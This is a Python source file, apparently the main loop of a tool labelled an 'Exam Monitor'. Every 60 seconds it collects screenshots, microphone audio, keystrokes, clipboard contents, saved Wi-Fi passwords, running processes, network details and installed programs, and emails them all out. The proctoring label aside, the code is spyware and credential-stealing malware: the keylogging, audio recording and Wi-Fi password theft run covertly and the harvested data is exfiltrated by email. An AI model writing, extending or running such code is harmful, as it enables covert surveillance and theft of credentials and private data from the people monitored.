import time
import os
import tempfile
from screenshot import capture_screenshot
from audio_record import record_audio
from keylogger import get_logged_keys
from system_info import (
    get_system_info,
    get_network_info,
    get_running_processes,
    get_clipboard_data,
    get_wifi_passwords,
    get_installed_programs
)
from send_email import send_email_alert

def main():
    print("🛡️ Starting monitoring every 60 seconds... Press Ctrl + C to stop.")
    
    while True:
        try:
            # Use temp folder to avoid saving in VS Code
            temp_dir = tempfile.gettempdir()
            timestamp = time.strftime("%Y%m%d_%H%M%S")

            screenshot_file = os.path.join(temp_dir, f"screenshot_{timestamp}.png")
            audio_file = os.path.join(temp_dir, f"audio_{timestamp}.wav")

            # Collect data
            capture_screenshot(screenshot_file)
            record_audio(audio_file)
            typed_keys = get_logged_keys()

            # Build full report
            email_body = f"""
Exam Monitor Report: 
=================
Keystrokes Captured: {typed_keys}

System Information:
-------------------
{get_system_info()}

Network Information:
--------------------
{get_network_info()}

Running Processes:
------------------
{get_running_processes()}

Clipboard Data:
---------------
{get_clipboard_data()}

Wi-Fi Passwords:
----------------
{get_wifi_passwords()}

Installed Programs:
-------------------
{get_installed_programs()}
"""

            # Send email
            send_email_alert(
                subject=f"⚠️ Exam Monitoring Report - {timestamp}",
                body=email_body,
                attachments=[screenshot_file, audio_file]
            )

            time.sleep(60)

        except KeyboardInterrupt:
            print("\n🛑 Monitoring stopped by user.")
            break

if __name__ == "__main__":
    main()
